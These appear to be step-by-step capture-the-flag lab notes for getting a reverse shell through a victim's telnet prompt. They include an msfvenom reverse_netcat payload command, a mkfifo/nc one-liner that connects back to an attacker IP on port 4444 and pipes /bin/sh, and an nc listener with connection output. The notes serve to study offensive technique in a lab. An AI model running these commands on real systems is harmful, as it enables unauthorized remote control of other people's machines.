Sets up a listener on the Attack Machine.

1. ping the attack machine from the victim from telnet prompt to check that we have a connection
```shell
RUN. ping 10.10.39.109 -c 1
```

2. Create the payload on the Attacker Machine that will be used to send the reverse shell request. 
	- Need to use the IP of the Attack machine to create the payload
```shell
msfvenom -p cmd/unix/reverse_netcat lhost=10.9.18.195 lport=4444 R

#this will output the command that needs to be used. 
#ignore all the output and just get the final line
mkfifo /tmp/hkuvtt; nc 10.9.18.195 4444 0</tmp/hkuvtt | /bin/sh >/tmp/hkuvtt 2>&1; rm /tmp/hkuvtt

```

3. The below command will tell the Victim machine to setup netcat  
```shell
mkfifo /tmp/hkuvtt; nc 10.9.18.195 4444 0</tmp/hkuvtt | /bin/sh >/tmp/hkuvtt 2>&1; rm /tmp/hkuvtt
```
4. On the Attack machine setup the listening port 
```shell
nc -lnvp 4444            
#output when the program is run
listening on [any] 4444 ...
```
5. On the victim machine run the telnet command
```shell
.RUN mkfifo /tmp/hkuvtt; nc 10.9.18.195 4444 0</tmp/hkuvtt | /bin/sh >/tmp/hkuvtt 2>&1; rm /tmp/hkuvtt

# The output is then shown on the Attack machine 
connect to [10.9.18.195] from (UNKNOWN) [10.10.224.183] 34172
```

5. you can then run commands on the the shell, but there is no fancy shell
